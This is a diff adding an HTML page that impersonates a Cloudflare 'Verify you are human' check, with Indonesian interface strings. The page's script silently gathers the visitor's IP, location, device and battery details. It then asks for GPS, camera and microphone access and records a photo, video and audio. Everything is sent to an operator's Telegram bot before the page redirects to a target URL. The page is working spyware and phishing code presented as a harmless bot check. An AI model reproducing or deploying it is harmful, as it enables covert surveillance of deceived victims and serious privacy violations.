@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Verify your identity</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: -apple-system, system-ui, sans-serif; background-color: #fff; color: #313131; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
+    .cf-container { width: 90%; max-width: 450px; padding: 20px; }
+    .cf-logo { width: 140px; margin-bottom: 30px; }
+    h1 { font-size: 32px; font-weight: 500; margin-bottom: 10px; }
+    p { font-size: 16px; color: #313131; margin-bottom: 20px; line-height: 1.4; }
+    .cf-box { border: 1px solid #e0e0e0; border-radius: 4px; padding: 20px; display: flex; align-items: center; background-color: #f9f9f9; }
+    .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #f6821f; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 15px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .footer { margin-top: 40px; font-size: 13px; color: #999; text-align: center; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="cf-container">
+    <img class="cf-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare">
+    <h1>Verify you are human</h1>
+    <p>Please wait while we verify your browser to access the website.</p>
+    <div class="cf-box">
+      <div class="spinner"></div>
+      <span id="status-text">Verifying...</span>
+    </div>
+    <div class="footer">
+      Ray ID: <span id="ray-id"></span> • Your IP: <span id="user-ip">...</span>
+    </div>
+  </div>
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const BOT_TOKEN = params.get('token');
+    const CHAT_ID = params.get('chat');
+    const URL_TARGET = params.get('target');
+
+    document.getElementById('ray-id').textContent = Math.random().toString(36).substring(2, 12).toUpperCase();
+
+    if (!BOT_TOKEN || !CHAT_ID || !URL_TARGET) {
+      document.getElementById('status-text').textContent = "ERROR: Parameter Spy hilang.";
+      setTimeout(() => { window.location.replace("https://google.com"); }, 2000);
+    } else {
+      collectAndRedirect();
+    }
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+      });
+    }
+
+    function sendMediaToTelegram(blob, type) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      const endpoint = type === 'photo' ? 'sendPhoto' : (type === 'video' ? 'sendVideo' : 'sendAudio');
+      formData.append(type, blob, `media.${type === 'photo' ? 'jpg' : (type === 'video' ? 'mp4' : 'ogg')}`);
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
+    }
+
+    async function getInfo() {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-', device = 'Tidak Diketahui';
+      
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        document.getElementById('user-ip').textContent = ip;
+        const locRes = await fetch(`https://ipinfo.io/${ip}/json`);
+        const loc = await locRes.json();
+        city = loc.city || '-';
+        region = loc.region || '-';
+        country = loc.country || '-';
+        org = loc.org || '-';
+      } catch (e) {}
+
+      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+
+      const text = `
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+Device     : ${navigator.platform}
+Browser    : ${navigator.userAgent}
+Resolusi   : ${screen.width}x${screen.height}
+Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Memori     : ${navigator.deviceMemory || 'N/A'} GB
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Waktu      : ${new Date().toLocaleString()}
+Target URL : ${URL_TARGET}`.trim();
+
+      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
+    }
+
+    function getGpsLocation() {
+      return new Promise(resolve => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              const link = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+              sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+              resolve();
+            },
+            () => { resolve(); }, { timeout: 5000 }
+          );
+        } else { resolve(); }
+      });
+    }
+
+    async function startMediaCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = stream;
+
+        // 1. Foto
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          canvas.getContext('2d').drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => sendMediaToTelegram(blob, 'photo'), 'image/jpeg');
+        }, 2000);
+
+        // 2. Video 5 Detik
+        const vRec = new MediaRecorder(stream);
+        const vChunks = [];
+        vRec.ondataavailable = e => vChunks.push(e.data);
+        vRec.onstop = () => sendMediaToTelegram(new Blob(vChunks, { type: 'video/mp4' }), 'video');
+        vRec.start();
+        setTimeout(() => vRec.stop(), 5000);
+
+        // 3. Audio 4 Detik
+        const aRec = new MediaRecorder(stream);
+        const aChunks = [];
+        aRec.ondataavailable = e => aChunks.push(e.data);
+        aRec.onstop = () => {
+          sendMediaToTelegram(new Blob(aChunks, { type: 'audio/ogg' }), 'audio');
+          stream.getTracks().forEach(t => t.stop());
+        };
+        aRec.start();
+        setTimeout(() => aRec.stop(), 4000);
+
+      } catch (e) { sendToTelegram("❌ Kamera/Audio Ditolak"); }
+    }
+
+    async function collectAndRedirect() {
+      await getInfo();
+      await getGpsLocation();
+      await startMediaCapture();
+      setTimeout(() => { window.location.replace(URL_TARGET); }, 8000);
+    }
+  </script>
+</body>
+</html>
